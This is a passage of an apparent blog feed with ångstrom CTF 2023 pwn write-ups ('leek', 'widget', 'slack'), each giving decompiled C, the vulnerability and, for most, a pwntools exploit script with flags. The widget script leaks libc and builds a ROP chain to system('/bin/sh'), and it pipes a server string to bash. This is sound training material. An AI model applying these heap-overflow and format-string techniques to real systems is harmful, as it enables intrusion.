class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span> = [<span class="number">0x3474737b66746361</span>, <span class="number">0x75715f74695f6b63</span>, <span class="number">0x615f74695f657565</span>, <span class="number">0x3437396461393136</span>, <span class="number">0x7d32326234363863</span>]</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">    l = <span class="built_in">hex</span>(l)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">16</span>,<span class="number">2</span>):</span><br><span class="line">        f = l[-i-<span class="number">1</span>]+l[-i]</span><br><span class="line">        f = <span class="built_in">int</span>(f, <span class="number">16</span>)</span><br><span class="line">        flag.append(<span class="built_in">chr</span>(f))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(flag))</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">actf&#123;st4ck_it_queue_it_a619ad974c864b22&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> angstrom </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>√•ngstrom CTF 2023 - leek (heap overflow)</title>
      <link href="/230427-angstromctf2023-3.leek/"/>
      <url>/230427-angstromctf2023-3.leek/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1859">https://ctftime.org/event/1859</a></li></ul><blockquote><p><code>nc challs.actf.co 31310</code><br>Author: JoshDaBosh</p></blockquote><ul><li>[143 solves &#x2F; 100 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+4h] [rbp-4Ch]</span></span><br><span class="line">  <span class="type">__gid_t</span> rgid; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> *heap_addr; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line">  <span class="type">void</span> *heap_random; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">40</span>]; <span class="comment">// [rsp+20h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v12; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(v3);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  rgid = getegid();</span><br><span class="line">  setresgid(rgid, rgid, rgid);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I dare you to leek my secret.&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; N; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    heap_addr = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">    heap_random = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">    <span class="built_in">memset</span>(heap_random, <span class="number">0</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">    getrandom();</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">31</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !*((_BYTE *)heap_random + j) || *((_BYTE *)heap_random + j) == <span class="number">10</span> )</span><br><span class="line">        *((_BYTE *)heap_random + j) = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your input (NO STACK BUFFER OVERFLOWS!!): &quot;</span>);</span><br><span class="line">    input(heap_addr);                           <span class="comment">// heap overflow</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;:skull::skull::skull: bro really said: &quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(heap_addr);                            <span class="comment">// print</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;So? What&#x27;s my secret? &quot;</span>);</span><br><span class="line">    fgets(s2, <span class="number">33</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strncmp</span>((<span class="type">const</span> <span class="type">char</span> *)heap_random, s2, <span class="number">0x20</span>uLL) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Okay, I&#x27;ll give you a reward for guessing it.&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Say what you want: &quot;</span>);</span><br><span class="line">    gets(heap_addr);    <span class="comment">// bof</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hmm... I changed my mind.&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(heap_random);</span><br><span class="line">    <span class="built_in">free</span>(heap_addr);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Next round!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Looks like you made it through.&quot;</span>);</span><br><span class="line">  win();</span><br><span class="line">  <span class="keyword">return</span> v12 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>I can find <code>heap overflow</code> in <code>memcpy</code> of <code>input()</code>. And then, There are second <code>bof</code> in <code>heap</code> from <code>gets()</code>. At that time, I should have understanding the structure of <code>heap</code>. If the structure of <code>heap</code> is destroyed, I‚Äôll be meet <code>Double free</code> vulnerability. (This will be caused by recognizing the <code>heap</code> as one.)</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./leek&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;challs.actf.co&#x27;</span>, <span class="number">31310</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./leek&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x64</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">64</span></span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;): &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">32</span></span><br><span class="line"></span><br><span class="line">    p.sendafter(<span class="string">&#x27;secret? &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">16</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(<span class="number">0x31</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">16</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;want: &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">actf&#123;very_133k_of_y0u_777522a2c32b7dd6&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> angstrom </category>
          
      </categories>
      
      
        <tags>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>√•ngstrom CTF 2023 - widget (fsb, bof)</title>
      <link href="/230427-angstromctf2023-4.widget/"/>
      <url>/230427-angstromctf2023-4.widget/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1859">https://ctftime.org/event/1859</a></li></ul><blockquote><p>I seem to have lost my gadgets.<br><code>nc challs.actf.co 31320</code><br>Author: JoshDaBosh</p></blockquote><ul><li>[116 solves &#x2F; 110 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-24h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">__gid_t</span> rgid; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  rgid = getegid();</span><br><span class="line">  setresgid(rgid, rgid, rgid);</span><br><span class="line">  <span class="keyword">if</span> ( called )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  called = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Amount: &quot;</span>);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( v4 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Contents: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, v4);                             <span class="comment">// bof</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; (<span class="type">int</span>)i &lt; v4; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( buf[i] == <span class="string">&#x27;n&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;bad %d\n&quot;</span>, i);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your input: &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(buf);                           <span class="comment">// fsb</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>I can find <code>fsb</code> vulnerability. But I can‚Äôt use <code>n</code> format string. I can only leak the stack address. But I can overwrite return address because of <code>bof</code> vulnerability. I can adjust input size.</p><p>I can find <code>win()</code> also.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">win</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, <span class="type">const</span> <span class="type">char</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">136</span>]; <span class="comment">// [rsp+10h] [rbp-90h] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(a1, <span class="string">&quot;14571414c5d9fe9ed0698ef21065d8a6&quot;</span>, <span class="number">0x20</span>uLL) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(a2, <span class="string">&quot;willy_wonka_widget_factory&quot;</span>, <span class="number">0x1A</span>uLL) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error: missing flag.txt.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">128</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This <code>win()</code> needs arguments to call. But I was not use this function. I can get libc‚Äôs address, So I can easily run the <code>system()</code>.</p><p>If you use this trick, It is important <code>rbp</code> have to in valid address.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><ol><li>leak the libc‚Äôs address and ret2main</li><li>ret2libc (<code>system</code>)</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">main2 = <span class="number">0x4013E3</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./widgetp&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;challs.actf.co&#x27;</span>, <span class="number">31320</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./widgetp&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;proof of work: &#x27;</span>)</span><br><span class="line"><span class="comment"># print( repr( subprocess.check_output([&#x27;bash&#x27;, &#x27;-c&#x27;, p.recvline()]) ))</span></span><br><span class="line">p.send(subprocess.check_output([<span class="string">&#x27;bash&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, p.recvline()]))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># payload += b&#x27;AAAAAAAA&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%3$p\n&#x27;</span>.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x404800</span>)</span><br><span class="line"><span class="comment"># payload += p64(ret)</span></span><br><span class="line">payload += p64(main2)</span><br><span class="line"><span class="comment"># payload += p64(0x401296)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>) - <span class="number">0x114a37</span></span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x2a3e5</span></span><br><span class="line">pop_rsi = <span class="number">0x2be51</span></span><br><span class="line">ret = <span class="number">0x29cd6</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span>)</span><br><span class="line">payload += p64(<span class="number">0x40402C</span>)</span><br><span class="line"><span class="comment"># payload += p64(0x12345678)</span></span><br><span class="line">payload += p64(pop_rdi + libc.address)</span><br><span class="line">payload += p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)))</span><br><span class="line">payload += p64(ret + libc.address)</span><br><span class="line">payload += p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">actf&#123;y0u_f0und_a_usefu1_widg3t!_30db5c45a07ac981&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> angstrom </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>√•ngstrom CTF 2023 - slack (fsb)</title>
      <link href="/230427-angstromctf2023-5.slack/"/>
      <url>/230427-angstromctf2023-5.slack/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1859">https://ctftime.org/event/1859</a></li></ul><blockquote><p>Join the √•ngstromCTF slack!<br><code>nc challs.actf.co 31500</code><br>Author: JoshDaBosh</p></blockquote><ul><li>[64 solves &#x2F; 140 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-68h]</span></span><br><span class="line">  <span class="type">__gid_t</span> rgid; <span class="comment">// [rsp+Ch] [rbp-64h]</span></span><br><span class="line">  <span class="type">time_t</span> timer; <span class="comment">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tm</span> *<span class="title">tp</span>;</span> <span class="comment">// [rsp+18h] [rbp-58h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [rsp+20h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">char</span> format[<span class="number">40</span>]; <span class="comment">// [rsp+40h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  rgid = getegid();</span><br><span class="line">  setresgid(rgid, rgid, rgid);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to slack (not to be confused with the popular chat service Slack)!&quot;</span>);</span><br><span class="line">  timer = time(<span class="number">0LL</span>);</span><br><span class="line">  tp = localtime(&amp;timer);</span><br><span class="line">  v3 = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(v3);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">2</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    strftime(s, <span class="number">0x1A</span>uLL, <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>, tp);</span><br><span class="line">    v4 = rand();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s -- slack Bot:  %s\n&quot;</span>, s, (&amp;messages)[v4 % <span class="number">8</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your message (to increase character limit, pay $99 to upgrade to Professional): &quot;</span>);</span><br><span class="line">    fgets(format, <span class="number">14</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    tp = localtime(&amp;timer);</span><br><span class="line">    strftime(s, <span class="number">0x1A</span>uLL, <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>, tp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s -- You: &quot;</span>, s);</span><br><span class="line">    <span class="built_in">printf</span>(format);                             <span class="comment">// fsb</span></span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v13 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>I just found the 3rd <code>fsb</code> only in this CTF. haha.</p><p>Anyway, only the buffer is 14 bytes. Actually 1 byte is for NULL. (Because <code>fgets()</code> receives string.)</p><p>Be careful when inputting with the <code>fgets()</code> becuase it receives an enter(‚Äò\n‚Äô). It means if you send 13 bytes, you‚Äôll have to send without ‚Äò\n‚Äô. And if you send under 13 bytes, you‚Äôll have to send including ‚Äò\n‚Äô.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>We can‚Äôt do overwriting because of <code>FULL RELRO</code>. </p><img src="/images/230427-angstromctf2023-5.slack/Screenshot 2023-04-27 at 18.03.16.png" width=500/><br><p>I need to get red‚Äôs offest(25) and yellow‚Äôs offset(55).</p><p>First, I access the red‚Äôs offset, and then write a <code>ptr_idx + 3</code> address. Because <code>ptr_idx</code> is small, so I have limit to trigger <code>fsb</code> vulnerability. So, I have to unlock this limit. I access yellow‚Äôs offset, and write a 0x80. Because I want to make <code>ptr_idx</code> as a negative.</p><p>So, I can trigger <code>fsb</code> vulnerability infinitely!! This rule also applies when <code>rop_payload</code> write to the stack.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 